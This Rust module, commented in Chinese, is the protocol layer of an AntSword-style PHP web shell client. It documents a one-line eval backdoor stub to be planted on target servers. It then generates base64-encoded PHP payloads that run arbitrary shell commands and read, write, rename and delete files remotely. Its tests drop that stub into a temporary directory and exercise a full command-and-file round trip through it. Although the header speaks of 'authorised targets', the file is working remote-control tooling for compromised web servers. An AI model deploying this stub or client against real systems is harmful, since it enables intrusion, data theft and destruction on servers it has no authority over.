//! 标准 PHP WebShell 协议（类蚁剑风格）。
//!
//! 服务端 stub 由用户自行部署到授权目标：
//! ```php
//! <?php @eval(base64_decode($_POST['x']));
//! ```
//! 客户端每次操作生成一段 PHP 代码，base64 后经 POST 参数 `x` 发送；
//! 代码将结果包裹在随机 `nonce` 帧内输出，客户端按 nonce 定位解析。
//! 所有路径 / 命令参数均以 base64 字面量嵌入代码，规避引号与转义问题。
//!
//! 本协议只生成白名单模板，不提供任意 PHP 代码透传入口。

use std::any::Any;
use std::time::Instant;

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use serde_json::Value;

use crate::domain::{AppSettings, CommandOutput, DirListing, FileEntry, ProbeResult, ShellProfile};

use super::transport::build_client;
use super::{Protocol, ProtocolError, SessionState};

pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";

/// PHP 协议的会话状态：持有专用 HTTP 客户端（每会话独立，避免跨会话并发干扰）。
pub struct PhpSession {
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
}

impl SessionState for PhpSession {
    fn as_any(&self) -> &dyn Any {
        self
    }
}

/// PHP 协议实例（无状态单例）。
pub struct PhpProtocol;

/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// 所有操作代码都拼接在它之后，并以 `{NONCE}` 帧收尾。
const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting(0);@set_time_limit(0);if(@$_POST['k']!=='{PWD}'){die('AUTH_FAIL');}"#;

/// 每个操作的公共收尾：输出 nonce 帧。
/// 调用方应把业务结果写入 `$__r`（PHP 数组），本段负责序列化输出。
const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
const TEMPLATE_FRAME_DIE: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;

impl PhpProtocol {
    /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
    fn build_code(template: &str, params: &[(&str, &str)]) -> String {
        let mut code = template.to_string();
        for (key, value) in params {
            code = code.replace(&format!("{{{key}}}"), value);
        }
        code
    }

    /// 发送一次协议请求并解析 nonce 帧，返回业务 JSON 值。
    ///
    /// 帧协议：调用方生成的 `code` 中必须包含 `echo '{nonce}';`（nonce 由本方法
    /// 随机生成并替换 `{NONCE}` 占位符），服务器会原样回显该 nonce，响应中
    /// 两个 nonce 之间的部分即协议帧。
    fn send_frame(
        &self,
        client: &reqwest::blocking::Client,
        endpoint: &str,
        password: &str,
        code_template: &str,
        settings: &AppSettings,
    ) -> Result<Value, ProtocolError> {
        // 8 字节随机 nonce（hex 字符串）
        let nonce = random_nonce();
        let code = code_template.replace("{NONCE}", &nonce);

        let body = url::form_urlencoded::Serializer::new(String::new())
            .append_pair("k", password)
            .append_pair("x", &B64.encode(code))
            .finish();

        let response = client
            .post(endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;

        if !response.status().is_success() {
            return Err(ProtocolError::HttpStatus(
                response.status().as_u16(),
                response.status().canonical_reason().unwrap_or("").to_string(),
            ));
        }

        let bytes = response
            .bytes()
            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
        if bytes.len() > max_bytes as usize {
            return Err(ProtocolError::ParseError(format!(
                "响应超过大小上限（{}MB）",
                settings.max_file_size_mb
            )));
        }
        let text = String::from_utf8_lossy(&bytes);

        // 鉴权失败时服务器直接输出明文 AUTH_FAIL（无帧）
        if text.contains("AUTH_FAIL") {
            return Err(ProtocolError::AuthFailed(
                "密码错误，服务器拒绝鉴权".to_string(),
            ));
        }

        // 按 nonce 帧定位响应体（帧外杂散输出天然免疫）
        let start = text.find(&nonce).ok_or_else(|| {
            ProtocolError::ParseError(
                "响应中未找到协议帧（请确认目标运行的是标准 PHP 协议 stub）".to_string(),
            )
        })?;
        let tail = &text[start + nonce.len()..];
        let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
            "协议帧不完整（响应被截断）".to_string(),
        ))?;
        let payload = &tail[..end];

        let decoded = B64
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
        let value: Value = serde_json::from_slice(&decoded)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;

        if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
            let error = value
                .get("error")
                .and_then(|v| v.as_str())
                .unwrap_or("未知错误")
                .to_string();
            return Err(ProtocolError::ServerError(error));
        }

        Ok(value)
    }
}

/// 8 字节真随机 nonce（hex 字符串），用于帧定位与防注入。
fn random_nonce() -> String {
    let mut bytes = [0u8; 8];
    // 随机源失败时退化为时间戳低位，仍能保证帧唯一性（仅防注入强度降低）
    if getrandom::fill(&mut bytes).is_err() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|duration| duration.subsec_nanos())
            .unwrap_or(0);
        bytes = (nanos as u64).to_le_bytes();
    }
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// 将 unix 时间戳格式化为本地时间的 `YYYY-MM-DD HH:MM`。
fn format_timestamp(ts: i64) -> String {
    use chrono::{DateTime, Local};
    DateTime::from_timestamp(ts, 0)
        .map(|datetime| datetime.with_timezone(&Local).format("%Y-%m-%d %H:%M").to_string())
        .unwrap_or_default()
}

impl Protocol for PhpProtocol {
    fn id(&self) -> &'static str {
        PHP_PROTOCOL_ID
    }

    fn display_name(&self) -> &'static str {
        "标准 PHP WebShell（类蚁剑）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        // 环境信息探测：不产生任何文件系统副作用
        let code = format!(
            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &profile.password)]),
            TEMPLATE_FRAME
        );
        let client = build_client(settings);
        let value = self.send_frame(&client, &profile.endpoint, &profile.password, &code, settings)?;

        let server = value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let web_server = value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let runtime = value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let current_dir = value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let separator = value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string();

        Ok(ProbeResult {
            status: "online".to_string(),
            server,
            web_server,
            runtime,
            current_dir,
            separator,
            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
        })
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        // 先探测验证密码与连通性，再建立会话
        let result = self.probe(profile, settings)?;
        let session: Box<dyn SessionState> = Box::new(PhpSession {
            endpoint: profile.endpoint.clone(),
            password: profile.password.clone(),
            client: build_client(settings),
        });
        Ok((session, result))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let cmd_b64 = B64.encode(command.as_bytes());
        let code = format!(
            "{}\n$c=base64_decode('{cmd_b64}');$o=@shell_exec($c.' 2>&1');$__r=array('ok'=>true,'data'=>array('stdout'=>base64_encode((string)$o),'cwd'=>getcwd()));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME
        );
        let start = Instant::now();
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let stdout = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .and_then(|bytes| String::from_utf8(bytes).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);

        Ok(CommandOutput { stdout, duration_ms, cwd })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>$is_dir?0:filesize($full),'mtime'=>filemtime($full));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;

        let entries: Vec<FileEntry> = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                    })
                    .collect()
            })
            .unwrap_or_default();

        Ok(DirListing { entries })
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$c=@file_get_contents($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>base64_encode($c));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;

        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$r=@file_put_contents($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        Ok(())
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');if(is_dir($p)){{$r=@rmdir($p);}}else{{$r=@unlink($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let from_b64 = B64.encode(from.as_bytes());
        let to_b64 = B64.encode(to.as_bytes());
        let code = format!(
            "{}\n$f=base64_decode('{from_b64}');$t=base64_decode('{to_b64}');$r=@rename($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$r=@mkdir($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        Ok(())
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$off={off};$len={len};$f=@fopen($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@fseek($f,$off);}}$c=($len>0)?@fread($f,$len):@stream_get_contents($f);@fclose($f);$__r=array('ok'=>true,'data'=>base64_encode((string)$c));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
            len = length,
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$off={off};$mode=($off>0&&@file_exists($p))?'r+b':'w+b';$f=@fopen($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@fseek($f,$off)>=0);if($ok){{@fwrite($f,$d);}}@fclose($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings)?;
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// 测试
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    use serde_json::json;

    use super::*;
    use crate::domain::ShellProfile;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
        }
    }

    fn profile(endpoint: &str) -> ShellProfile {
        ShellProfile {
            id: "test".into(),
            workspace_id: "ws".into(),
            name: "t".into(),
            endpoint: endpoint.into(),
            runtime: "php".into(),
            protocol_id: PHP_PROTOCOL_ID.into(),
            status: "unknown".into(),
            last_connected_at: None,
            created_at: "2026-01-01".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            tags: vec![],
        }
    }

    /// 起一个假 PHP 服务器：解析收到的 `k`/`x` 参数，把 (code, k) 通过 channel 上报，
    /// 从代码中提取 nonce，然后用传入的 `respond` 生成 JSON data 包裹进该 nonce 帧回送
    /// （模拟真实 stub 的 echo 行为）。若 `respond` 返回 `None`，则回送明文 AUTH_FAIL。
    fn spawn_fake_server(
        respond: impl Fn(String, String) -> Option<Value> + Send + 'static,
    ) -> (String, std::sync::mpsc::Receiver<(String, String)>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = Vec::new();
                let mut temp = [0u8; 8192];
                loop {
                    match stream.read(&mut temp) {
                        Ok(0) => break,
                        Ok(n) => {
                            buf.extend_from_slice(&temp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                let request = String::from_utf8_lossy(&buf);
                let body_start = request.find("\r\n\r\n").map(|i| i + 4).unwrap_or(request.len());
                let body = &request[body_start.min(request.len())..];

                let params: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
                    .map(|(k, v)| (k.into_owned(), v.into_owned()))
                    .collect();
                let k = params
                    .iter()
                    .find(|(key, _)| key == "k")
                    .map(|(_, v)| v.clone())
                    .unwrap_or_default();
                let x = params
                    .iter()
                    .find(|(key, _)| key == "x")
                    .map(|(_, v)| v.clone())
                    .unwrap_or_default();
                let code = String::from_utf8(B64.decode(&x).unwrap_or_default()).unwrap_or_default();
                let _ = tx.send((k.clone(), code.clone()));

                // 从代码中提取 `echo '{nonce}'` 帧标记
                let nonce = code
                    .split("echo '")
                    .nth(1)
                    .and_then(|part| part.split('\'').next())
                    .unwrap_or("abababab")
                    .to_string();

                let body = match respond(code, k) {
                    Some(data) => {
                        format!("{}{}{}", nonce, B64.encode(json!(data).to_string()), nonce)
                    }
                    None => "AUTH_FAIL".to_string(),
                };
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.flush();
            }
        });
        (format!("http://{addr}"), rx)
    }

    #[test]
    fn probe_round_trip_with_fake_server() {
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"server": "Linux fake", "web_server": "Apache", "php_version": "8.2.0"}}))
        });
        let proto = PhpProtocol;
        let result = proto.probe(&profile(&url), &settings()).expect("探测应成功");
        assert_eq!(result.server, "Linux fake");
        assert_eq!(result.web_server, "Apache");
        assert_eq!(result.runtime, "8.2.0");

        // 断言服务器收到的请求：密码正确、载荷是 base64 且包含鉴权模板与 PWD 字面量
        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到请求");
        assert_eq!(k, "secret");
        assert!(code.contains("AUTH_FAIL"), "载荷应包含鉴权失败分支");
        assert!(code.contains("'secret'"), "载荷应包含密码字面量");
    }

    #[test]
    fn wrong_password_returns_auth_failed() {
        // 模拟真实 stub 的鉴权行为：密码不匹配时直接输出 AUTH_FAIL 明文
        let (url, _rx) = spawn_fake_server(|_code, k| {
            if k == "secret" {
                Some(json!({"ok": true, "data": {}}))
            } else {
                None
            }
        });
        let proto = PhpProtocol;
        let mut profile = profile(&url);
        profile.password = "wrong".into();
        let result = proto.probe(&profile, &settings());
        assert!(
            matches!(result, Err(ProtocolError::AuthFailed(_))),
            "密码错误时应报鉴权失败，实际：{result:?}"
        );
    }

    #[test]
    fn exec_round_trip() {
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"stdout": base64::engine::general_purpose::STANDARD.encode("uid=0(root)")}}))
        });
        let profile = profile(&url);
        let settings = settings();
        let (session, _) = PhpProtocol.connect(&profile, &settings).unwrap();
        let output = PhpProtocol
            .execute_command(session.as_ref(), "id", &settings)
            .expect("执行应成功");
        assert_eq!(output.stdout, "uid=0(root)");

        // connect 内部会先发一次 probe 请求，因此第二条消息才是 exec 载荷
        let _ = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("应收到 probe 请求");
        let (k, code) = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("应收到 exec 请求");
        assert_eq!(k, "secret");
        assert!(code.contains("shell_exec"), "载荷应包含 shell_exec");
    }

    #[test]
    fn auth_fail_text_is_detected() {
        // 服务器回送 AUTH_FAIL 明文时，客户端必须报鉴权失败而不是解析错误
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = [0u8; 8192];
                let _ = stream.read(&mut buf);
                let body = "AUTH_FAIL";
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
            }
        });
        let proto = PhpProtocol;
        let result = proto.probe(&profile(&format!("http://{addr}")), &settings());
        assert!(matches!(result, Err(ProtocolError::AuthFailed(_))), "应报鉴权失败");
    }

    // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---

    /// 在本机临时目录写入 stub 并起 `php -S`，返回 (endpoint, 清理函数)。
    /// 若无 php 可执行则返回 None（跳过测试）。
    fn spawn_php_server() -> Option<(String, std::path::PathBuf, std::process::Child)> {
        let php = std::process::Command::new("php").arg("-v").output().ok()?;
        if !php.status.success() {
            return None;
        }
        let dir = std::env::temp_dir().join(format!("dosword-php-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).ok()?;
        std::fs::write(
            dir.join("shell.php"),
            r#"<?php @eval(base64_decode($_POST['x']));"#,
        )
        .ok()?;
        std::fs::create_dir_all(dir.join("www")).ok()?;
        std::fs::write(dir.join("www/hello.txt"), b"hello dosword").ok()?;

        let port = {
            // 取一个空闲端口
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        let child = std::process::Command::new("php")
            .arg("-S")
            .arg(format!("127.0.0.1:{port}"))
            .arg("-t")
            .arg(&dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok()?;
        // 等待服务器就绪
        let url = format!("http://127.0.0.1:{port}/shell.php");
        for _ in 0..50 {
            if std::net::TcpStream::connect(format!("127.0.0.1:{port}")).is_ok() {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        Some((url, dir, child))
    }

    #[test]
    fn real_php_full_round_trip() {
        let Some((url, dir, mut child)) = spawn_php_server() else {
            eprintln!("跳过：未检测到 php 可执行文件");
            return;
        };
        let mut profile = profile(&url);
        profile.password = "secret".into();

        let proto = PhpProtocol;
        let settings = settings();

        // 探测
        let probe = proto.probe(&profile, &settings).expect("探测应成功");
        assert!(!probe.server.is_empty(), "应返回真实服务器信息");
        assert_eq!(probe.separator, "/");

        // 连接 + 执行命令
        let (session, _) = proto.connect(&profile, &settings).expect("连接应成功");
        let output = proto
            .execute_command(session.as_ref(), "printf 'hello-cmd'", &settings)
            .expect("命令应执行成功");
        assert_eq!(output.stdout.trim(), "hello-cmd");

        // 文件操作往返：写 → 读 → 改名 → 列表 → 删除
        let file_path = dir.join("www/new.txt");
        let file_path_str = file_path.to_str().unwrap();
        proto
            .write_file(session.as_ref(), file_path_str, b"file-content-123", &settings)
            .expect("写入应成功");
        let content = proto
            .read_file(session.as_ref(), file_path_str, &settings)
            .expect("读取应成功");
        assert_eq!(content, b"file-content-123");

        // 建目录（递归）→ 目录内写文件 → 列表可见
        let sub_dir = dir.join("www/sub/deep");
        let sub_dir_str = sub_dir.to_str().unwrap();
        proto
            .create_dir(session.as_ref(), sub_dir_str, &settings)
            .expect("建目录应成功");
        let nested_file = sub_dir.join("nested.txt");
        proto
            .write_file(session.as_ref(), nested_file.to_str().unwrap(), b"nested", &settings)
            .expect("目录内写入应成功");
        let listing = proto
            .list_dir(session.as_ref(), sub_dir_str, &settings)
            .expect("列表应成功");
        assert!(listing.entries.iter().any(|e| e.name == "nested.txt"));

        // 分块读写：偏移 0 创建 → 偏移追加 → 区间/全量读取
        let chunked = dir.join("www/chunked.bin");
        let chunked_str = chunked.to_str().unwrap();
        proto
            .write_chunk(session.as_ref(), chunked_str, b"AAAA", 0, &settings)
            .expect("分块写入（创建）应成功");
        proto
            .write_chunk(session.as_ref(), chunked_str, b"BBBB", 4, &settings)
            .expect("分块写入（追加）应成功");
        let prefix = proto
            .read_chunk(session.as_ref(), chunked_str, 0, 4, &settings)
            .expect("区间读取应成功");
        assert_eq!(prefix, b"AAAA");
        let full = proto
            .read_chunk(session.as_ref(), chunked_str, 0, 0, &settings)
            .expect("全量读取应成功");
        assert_eq!(full, b"AAAABBBB");

        let renamed = dir.join("www/renamed.txt");
        proto
            .rename_path(session.as_ref(), file_path_str, renamed.to_str().unwrap(), &settings)
            .expect("改名应成功");

        let listing = proto
            .list_dir(session.as_ref(), dir.join("www").to_str().unwrap(), &settings)
            .expect("列表应成功");
        assert!(listing.entries.iter().any(|e| e.name == "renamed.txt"));
        assert!(listing.entries.iter().any(|e| e.name == "hello.txt"));

        proto
            .delete_path(session.as_ref(), renamed.to_str().unwrap(), &settings)
            .expect("删除应成功");
        let listing = proto
            .list_dir(session.as_ref(), dir.join("www").to_str().unwrap(), &settings)
            .expect("列表应成功");
        assert!(!listing.entries.iter().any(|e| e.name == "renamed.txt"));

        // 错误路径：删除非空目录应报业务错误
        let result = proto.delete_path(session.as_ref(), dir.to_str().unwrap(), &settings);
        assert!(
            matches!(result, Err(ProtocolError::ServerError(_))),
            "删除非空目录应失败"
        );

        // 说明：真实 stub 不存储密码（密码字面量由客户端嵌入载荷），
        // 因此"密码错误"（服务器额外校验 k）的场景由假服务器测试
        // `wrong_password_returns_auth_failed` 覆盖，这里不做重复断言。

        // 清理
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
    }
}
